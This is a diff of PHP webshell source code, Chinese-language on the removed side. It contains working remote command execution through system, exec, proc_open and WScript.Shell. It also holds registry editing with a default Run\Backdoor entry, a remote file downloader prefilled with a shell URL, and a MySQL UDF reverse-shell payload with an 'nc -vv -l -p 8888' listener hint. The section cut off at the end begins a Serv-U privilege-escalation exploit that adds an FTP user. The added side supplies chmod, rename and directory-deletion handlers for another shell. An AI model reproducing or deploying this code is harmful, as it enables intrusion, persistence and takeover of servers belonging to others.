+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Write</b></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Execute</b></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="right" nowrap>Octal:</td>
+                <td align="center"><input type="text" name="t_owner" value="" size="1"></td>
+                <td align="center"><input type="text" name="t_group" value="" size="1"></td>
+                <td align="center"><input type="text" name="t_other" value="" size="1"></td>
+                <td align="left"><b>=</b> <input type="text" name="t_total" value="777" size="3"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="right" nowrap>Symbolic:</td>
+                <td align="center"><input type="text" name="sym_owner" value="" size="3"></td>
+                <td align="center"><input type="text" name="sym_group" value="" size="3"></td>
+                <td align="center"><input type="text" name="sym_other" value="" size="3"></td>
+                <td align="left" width=100><b>=</b> <input type="text" name="sym_total" value="" size="10"></td>
+        </tr>
+</table></td></tr></table></p>
+HTML;
+
+print "<center>".$chmd."
+
+<b>$d/$wich_f</b><br><br>
+<input type=submit value=CHMOD></form>
+</center>
+</form>
+";
+$t_total=$_POST['t_total'];
+if($t_total){
+chmod($d."/".$wich_f,$t_total);
+print "<center><font color=green><br><b>Now chmod is $t_total</b><br><br></font>";
+print "<a href='$php_self?d=$d'># BACK</a><br><br>";
+}
+echo $copyr;
+exit;
 }
 
-// 写入注册表
-elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
-	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
-	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
-	echo ($a=='0') ? "写入注册表健值成功!" : "写入 ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." 失败!";
+# rename
+if(@$_GET['rename']){
+print "<b><font color=green>RENAME $d/$wich_f ?</b></font><br><br>
+<center>
+<form method=post>
+<b>RENAME</b><br><u>$wich_f</u><br><Br><B>TO</B><br>
+<input name=rto size=40 value='$wich_f'><br><br>
+<input type=submit value=RENAME>
+</form>
+";
+
+@$rto=$_POST['rto'];
+
+if($rto){
+$fr1=$d."/".$wich_f;
+$fr1=str_replace("//","/",$fr1);
+$to1=$d."/".$rto;
+$to1=str_replace("//","/",$to1);
+
+rename($fr1,$to1);
+print "File <br><b>$wich_f</b><br>Renamed to <b>$rto</b><br><br>";
+
+echo "<meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\">";
+
 }
 
-// 删除注册表
-elseif(($regdelete) AND !empty($_POST['delregname'])) {
-	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
-	$a = @$shell->RegDelete($_POST['delregname']);
-	echo ($a=='0') ? "删除注册表健值成功!" : "删除 ".$_POST['delregname']." 失败!";
+echo $copyr;
+exit;
 }
 
-else {
-	echo "$notice";
-}
 
-echo "</b></p>\n";
-/*===================== 执行操作 结束 =====================*/
 
-if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
-	$tb->tableheader();
-?>
-  <tr bgcolor="#cccccc">
-    <td align="center" nowrap width="27%"><b>文件</b></td>
-	<td align="center" nowrap width="16%"><b>创建日期</b></td>
-    <td align="center" nowrap width="16%"><b>最后修改</b></td>
-    <td align="center" nowrap width="11%"><b>大小</b></td>
-    <td align="center" nowrap width="6%"><b>属性</b></td>
-    <td align="center" nowrap width="24%"><b>操作</b></td>
-  </tr>
-<?php
-// 目录列表
-$dirs=@opendir($dir);
-$dir_i = '0';
-while ($file=@readdir($dirs)) {
-	$filepath="$dir/$file";
-	$a=@is_dir($filepath);
-	if($a=="1"){
-		if($file!=".." && $file!=".")	{
-			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
-			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
-			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
-			echo "<tr class=".getrowbg().">\n";
-			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
-			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
-			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
-			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
-			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
-			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!','1')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">改名</a> |</td>\n";
-			echo "</tr>\n";
-			$dir_i++;
-		} else {
-			if($file=="..") {
-				echo "<tr class=".getrowbg().">\n";
-				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>\n";
-				echo "</tr>\n";
-			}
-		}
-	}
-}// while
-@closedir($dirs); 
-?>
-<tr bgcolor="#cccccc">
-  <td colspan="6" height="5"></td>
-</tr>
-<FORM action="" method="POST">
-<?
-// 文件列表
-$dirs=@opendir($dir);
-$file_i = '0';
-while ($file=@readdir($dirs)) {
-	$filepath="$dir/$file";
-	$a=@is_dir($filepath);
-	if($a=="0"){		
-		$size=@filesize($filepath);
-		$size=$size/1024 ;
-		$size= @number_format($size, 3);
-		if (@filectime($filepath) == @filemtime($filepath)) {
-			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
-			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
-		} else {
-			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
-			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
-		}
-		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
-		echo "<tr class=".getrowbg().">\n";
-		echo "  <td style=\"padding-left: 5px;\">";
-		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
-		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
-		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
-		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
-		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
-		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
-		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','你确定要删除 $file 文件吗?','2')\">删除</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">改名</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">时间</a></td>\n";
-		echo "</tr>\n";
-		$file_i++;
-	}
-}// while
-@closedir($dirs); 
-$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','选中文件打包下载','','submit').'</td><td align="right">'.$dir_i.' 个目录 / '.$file_i.' 个文件</td></tr></table>','center',getrowbg(),'','','6');
 
-echo "</FORM>\n";
-echo "</table>\n";
-}// end dir
-
-elseif ($_GET['action'] == "editfile") {
-	if(empty($newfile)) {
-		$filename="$dir/$editfile";
-		$fp=@fopen($filename,"r");
-		$contents=@fread($fp, filesize($filename));
-		@fclose($fp);
-		$contents=htmlspecialchars($contents);
-	}else{
-		$editfile=$newfile;
-		$filename = "$dir/$editfile";
-	}
-	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
-	$tb->tableheader();
-	$tb->formheader($action,'新建/编辑文件');
-	$tb->tdbody('当前文件: '.$tb->makeinput('editfilename',$filename).' 输入新文件名则建立新文件 Php代码加密: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'这个功能只可以用来加密或是压缩完整的php代码。\\n\\n非php代码或不完整php代码或不支持gzinflate函数请不要使用！\')"> ');
-	$tb->tdbody($tb->maketextarea('filecontent',$contents));
-	$tb->makehidden('do','doeditfile');
-	$tb->formfooter('1','30');
-}//end editfile
-
-elseif ($_GET['action'] == "rename") {
-	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
-	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
-	$tb->tableheader();
-	$tb->formheader($action,'修改文件名');
-	$tb->makehidden('oldname',$dir."/".$nowfile);
-	$tb->makehidden('dir',$dir);
-	$tb->tdbody('当前文件名: '.basename($nowfile));
-	$tb->tdbody('改名为: '.$tb->makeinput('newname'));
-	$tb->makehidden('do','rename');
-	$tb->formfooter('1','30');
-}//end rename
-
-elseif ($_GET['action'] == "eval") {
-	$action = "?dir=".urlencode($dir)."";
-	$tb->tableheader();
-	$tb->formheader(''.$action.' "target="_blank' ,'执行php脚本');
-	$tb->tdbody($tb->maketextarea('phpcode',$contents));
-	$tb->formfooter('1','30');
-	
-}
-elseif ($_GET['action'] == "fileperm") {
-	$action = "?dir=".urlencode($dir)."&file=".$file;
-	$tb->tableheader();
-	$tb->formheader($action,'修改文件属性');
-	$tb->tdbody('修改 '.$file.' 的属性为: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
-	$tb->makehidden('file',$file);
-	$tb->makehidden('dir',urlencode($dir));
-	$tb->makehidden('do','editfileperm');
-	$tb->formfooter('1','30');
-}//end fileperm
-
-elseif ($_GET['action'] == "newtime") {
-	$action = "?dir=".urlencode($dir);
-	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
-	$tb->tableheader();
-	$tb->formheader($action,'克隆文件最后修改时间');
-	$tb->tdbody("修改文件: ".$tb->makeinput('curfile',$file,'readonly')." → 目标文件: ".$tb->makeinput('tarfile','需填完整路径及文件名'),'center','2','30');
-	$tb->makehidden('do','domodtime');
-	$tb->formfooter('','30');
-	$tb->formheader($action,'自定义文件最后修改时间');
-	$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');
-	$tb->tdbody('当前文件名: '.$file);
-	$tb->makehidden('curfile',$file);
-	$tb->tdbody('修改为: '.$tb->makeinput('year','1984','','text','4').' 年 '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' 月 '.$tb->makeinput('data','18','','text','2').' 日 '.$tb->makeinput('hour','20','','text','2').' 时 '.$tb->makeinput('minute','00','','text','2').' 分 '.$tb->makeinput('second','00','','text','2').' 秒','center','2','30');
-	$tb->makehidden('do','modmytime');
-	$tb->formfooter('1','30');
-}//end newtime
-
-elseif ($_GET['action'] == "shell") {
-	$action = "??action=shell&dir=".urlencode($dir);
-	$tb->tableheader();
-	$tb->tdheader('WebShell Mode');
-  if (substr(PHP_OS, 0, 3) == 'WIN') {
-		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
-		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
-		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
-		$tb->tdbody('无回显运行程序 → 文件: '.$tb->makeinput('program',$program).' 参数: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
-		$tb->makehidden('do','programrun');
-		echo "</form>\n";
-	}
- echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
- if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
-	$tb->tdbody('提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容. ');
-	$tb->tdbody('proc_open函数假设不是默认的winnt系统请自行设置使用,自行修改记得写退出,否则会在主机上留下一个未结束的进程.');
-	$tb->tdbody('proc_open函数要使用的cmd程序的位置:'.$tb->makeinput('cmd',$cmd,'','text','30').'(要是是linux系统还是大大们自己修改吧)');
-   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
-   $tb->tdbody('选择执行函数: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' 输入命令: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
-?>
-  <tr class="secondalt">
-    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
-	if (!empty($_POST['command'])) {
-		if ($execfunc=="system") {
-			system($_POST['command']);
-		} elseif ($execfunc=="passthru") {
-			passthru($_POST['command']);
-		} elseif ($execfunc=="exec") {
-			$result = exec($_POST['command']);
-			echo $result;
-		} elseif ($execfunc=="shell_exec") {
-			$result=shell_exec($_POST['command']);
-			echo $result;	
-		} elseif ($execfunc=="popen") {
-			$pp = popen($_POST['command'], 'r');
-			$read = fread($pp, 2096);
-			echo $read;
-			pclose($pp);
-		} elseif ($execfunc=="wscript") {
-			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
-			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
-			$stdout = $exec->StdOut();
-			$stroutput = $stdout->ReadAll();
-			echo $stroutput;
-		} elseif($execfunc=="proc_open"){
-$descriptorspec = array(
-   0 => array("pipe", "r"),
-   1 => array("pipe", "w"),
-   2 => array("pipe", "w")
-);
-$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
-if (is_resource($process)) {
-
-    // 写命令
-    fwrite($pipes[0], "".$_POST['command']."\r\n");
-    fwrite($pipes[0], "exit\r\n");
-    fclose($pipes[0]);
-    // 读取输出
-    while (!feof($pipes[1])) {
-        echo fgets($pipes[1], 1024);
-    }
-    fclose($pipes[1]);
-    while (!feof($pipes[2])) {
-        echo fgets($pipes[2], 1024);
-      }
-    fclose($pipes[2]);
-
-    proc_close($process);
-}
-		} else {
-			system($_POST['command']);
-		}
-	}
-	?></textarea></td>
-  </tr>  
-  </form>
-</table>
-<?php
-}//end shell
-
-elseif ($_GET['action'] == "reg") {
-	$action = '?action=reg';
-	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
-	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
-	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
-	$delregname = $_POST['delregname'];
-	$tb->tableheader();
-	$tb->formheader($action,'读取注册表');
-	$tb->tdbody('键值: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','读取','','submit'),'center','2','50');
-	echo "</form>";
-
-	$tb->formheader($action,'写入注册表');
-	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
-	$tb->tdbody('键值: '.$tb->makeinput('writeregname',$registre,'','text','56').' 类型: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' 值:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','写入','','submit'),'center','2','50');
-	echo "</form>";
-
-	$tb->formheader($action,'删除注册表');
-	$tb->tdbody('键值: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','删除','','submit'),'center','2','50');
-	echo "</form>";
-	$tb->tablefooter();
-}//end reg
-elseif ($_GET['action'] == "downloads"){
-$action = '?action=dir';
-	$tb->tableheader();
-	$tb->formheader($action,'http文件下载模式');
-	$tb->tdbody('你可以使用本功能把一些小工具以http方式下载到此服务器','center');
-	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
-	echo "</form>";
-	$tb->tdbody('注意,假设文件太大将无法下载下来而且影响执行速度.','center');
-	$tb->tablefooter();
-}
-elseif ($_GET['action'] == "search"){
-$action = '?dir='.$dir.'';
-	$tb->tableheader();
-	$tb->formheader($action,'文件查找');
-	$tb->tdbody('你可以使用本功能查找一个目录下的文件里哪写文件包含着关键词!','center');
-	$tb->tdbody('文件位置: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>查找文字:'.$tb->makeinput('oldkey','下贱','','text','60').''.$tb->makehidden('do','search').'<br> 是否计算所在行<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'选定此处将会列出关键词在所在文件的多少行,和所在的那文件有多少行进行比对\\n\\n格式为:[所在行/文件总行]例如[12/99],用来进行分析.\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> (此功能和下面一个功能会影响执行速度，所以默认关闭!) <br>适当读取:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'选定此处将会列出关键词在所在位置及你设定结束区域内的部分字符..\\n\\n采取此功能查找完文件后把鼠标移动到找到的文件名上即可读取分析....\\n\\n此功能可能会增加一部分的延时,请考虑使用,没有可读权限将出错!\')"> 读取关键词前'.$tb->makeinput('beline','0','','text','3').'个字符 '.$tb->makehidden('dir',''.$dir.'').'到关键词后第'.$tb->makeinput('endline','10','','text','3').'个字符... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','开始查找文件','','submit'),'center','1','35');
-	echo "</form>";
-	$tb->tdbody('请表太大的目录了，慢慢浏览慢慢找好不好嘛.假设选定计算行速度会慢。显示[所在行/总共多少行]','center');
-	$tb->tablefooter();
-}
-elseif ($_GET['action'] == "proxy") {
-	$action = '?action=proxy';
-	$tb->tableheader();
-	$tb->formheader($action,'在线代理','proxyframe');
-	$tb->tdbody('<br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
-	$tb->tdbody('URL: '.$tb->makeinput('url','http://1v1.name','','text','100').' '.$tb->makeinput('','浏览','','submit'),'center','1','40');
-	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://1v1.name"></iframe>');
-	echo "</form>";
-	$tb->tablefooter();
-}//end proxy
-
-elseif ($_GET['action'] == "sql") {
-	$action = '?action=sql';
-
-	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
-	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
-	$dbpassword = $_POST['dbpassword'];
-	$dbname = $_POST['dbname'];
-	$sql_query = $_POST['sql_query'];
-if($type=="fun"){
-$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
-select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*这个最好先执行了上面一句再用*/
-/*请在你计算机上执行 nc -vv -l -p 8888*/";
-}
-	$tb->tableheader();
-	$tb->formheader($action,'执行 SQL 语句');
-	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
-	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
-	$tb->makehidden('do','query');
-	$tb->formfooter('1','30');
-}//end sql query
-
-elseif ($_GET['action'] == "sqlbak") {
-	$action = '?action=sqlbak';
-	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
-	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
-	$dbpassword = $_POST['dbpassword'];
-	$dbname = $_POST['dbname'];
-	$tb->tableheader();
-	$tb->formheader($action,'备份 MySQL 数据库');
-	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','连接','','submit'));
-	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
-    $tables = @mysql_list_tables($dbname);
-    while ($table = @mysql_fetch_row($tables)) {
-		$cachetables[$table[0]] = $table[0];
-    }
-    @mysql_free_result($tables);
-	if (empty($cachetables)) {
-		$tb->tdbody('<b>您没有连接数据库 or 当前数据库没有任何数据表</b>');
-	} else {
-		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">请选择表:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> 备份数据所保存的路径:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> 直接下载到本地 (适合数据量较小的数据库)</td></tr></table>');
-		$tb->makehidden('do','backupmysql');
-		$tb->formfooter('0','30');
-	}
-	$tb->tablefooter();
-	@mysql_close();
-}//end sql backup
-
-elseif ($_GET['action'] == "phpenv") {
-	$user = " <a href=\"?action=nowuser\" target=\"_blank\">以免crush点此获取当前进程用户名</a> ";
-	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
-	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
-	if ($dis_func == "") {
-		$dis_func = "No";
-	}else {
-		$dis_func = str_replace(" ","<br>",$dis_func);
-		$dis_func = str_replace(",","<br>",$dis_func);
-	}
-	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
-		$info = array(
-		    0 => array("当前php进程用户",$user),
-			1 => array("服务器操作系统",PHP_OS),
-			2 => array("服务器时间",date("Y年m月d日 h:i:s",time())),
-			3 => array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
-			4 => array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
-			5 => array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
-			6 => array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
-			7 => array("Web服务端口",$_SERVER['SERVER_PORT']),
-			8 => array("PHP运行方式",strtoupper(php_sapi_name())),
-			9 => array("PHP版本",PHP_VERSION),
-			10 => array("运行于安全模式",getphpcfg("safemode")),
-			11 => array("服务器管理员",$adminmail),
-			12 => array("本文件路径",__FILE__),
-            13 => array("允许使用 URL 打开文件 allow_url_fopen",getphpcfg("allow_url_fopen")),
-			14 => array("允许动态加载链接库 enable_dl",getphpcfg("enable_dl")),
-			15 => array("显示错误信息 display_errors",getphpcfg("display_errors")),
-			16 => array("自动定义全局变量 register_globals",getphpcfg("register_globals")),
-			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
-			18 => array("程序最多允许使用内存量 memory_limit",getphpcfg("memory_limit")),
-			19 => array("POST最大字节数 post_max_size",getphpcfg("post_max_size")),
-			20 => array("允许最大上传文件 upload_max_filesize",$upsize),
-			21 => array("程序最长运行时间 max_execution_time",getphpcfg("max_execution_time")."秒"),
-			22 => array("被禁用的函数 disable_functions",$dis_func),
-			23 => array("phpinfo()",$phpinfo),
-			24 => array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
-            25 => array("图形处理 GD Library",getfun("imageline")),
-			26 => array("IMAP电子邮件系统",getfun("imap_close")),
-			27 => array("MySQL数据库",getfun("mysql_close")),
-			28 => array("SyBase数据库",getfun("sybase_close")),
-			29 => array("Oracle数据库",getfun("ora_close")),
-			30 => array("Oracle 8 数据库",getfun("OCILogOff")),
-			31 => array("PREL相容语法 PCRE",getfun("preg_match")),
-			32 => array("PDF文档支持",getfun("pdf_close")),
-			33 => array("Postgre SQL数据库",getfun("pg_close")),
-			34 => array("SNMP网络管理协议",getfun("snmpget")),
-			35 => array("压缩文件支持(Zlib)",getfun("gzclose")),
-			36 => array("XML解析",getfun("xml_set_object")),
-			37 => array("FTP",getfun("ftp_login")),
-			38 => array("ODBC数据库连接",getfun("odbc_close")),
-			39 => array("Session支持",getfun("session_start")),
-			40 => array("Socket支持",getfun("fsockopen")),
-		); 
-	$tb->tableheader();
-	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
-	$tb->tdbody('<b>查看PHP配置参数状况</b>','left','1','30','style="padding-left: 5px;"');
-	$tb->tdbody('请输入配置参数(如:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','查看','','submit'),'left','2','30','style="padding-left: 5px;"');
-	$tb->makehidden('do','viewphpvar');
-	echo "</form>\n";
-	$hp = array(0=> '服务器特性', 1=> 'PHP基本特性', 2=> '组件支持状况');
-	for ($a=0;$a<3;$a++) {
-		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
-?>
-  <tr class="secondalt">
-    <td>
-      <table width="100%" border="0" cellpadding="0" cellspacing="0">
-<?php
-		if ($a==0) {
-			for($i=0;$i<=12;$i++) {
-				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
-			}
-		} elseif ($a == 1) {
-			for ($i=13;$i<=24;$i++) {
-				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
-			}
-		} elseif ($a == 2) {
-			for ($i=25;$i<=40;$i++) {
-				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
-			}
-		}
-?>
-      </table>
-    </td>
-  </tr>
-<?php
-	}//for
-echo "</table>";
-}//end phpenv
-elseif($_GET['action'] == "SUExp")
+if(@$_GET['deldir']){
+@$dir=$_GET['dir'];
+function deldir($dir)
 {
-    if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "" && $_POST['SUCommand'])
-    {
-        echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
-        $sendbuf = "";
-        $recvbuf = "";
-        $domain  = "-SETDOMAIN\r\n".
-                "-Domain=haxorcitos|0.0.0.0|2121|-1|1|0\r\n".
-                "-TZOEnable=0\r\n".
-                " TZOKey=\r\n";
-        $adduser = "-SETUSERSETUP\r\n".
-                "-IP=0.0.0.0\r\n".
-                "-PortNo=2121\r\n".
-                "-User=Will_Be\r\n".
-                "-Password=Will_Be\r\n".
-                "-HomeDir=c:\\\r\n".
-                "-LoginMesFile=\r\n".
-                "-Disable=0\r\n".
-                "-RelPaths=1\r\n".
-                "-NeedSecure=0\r\n".
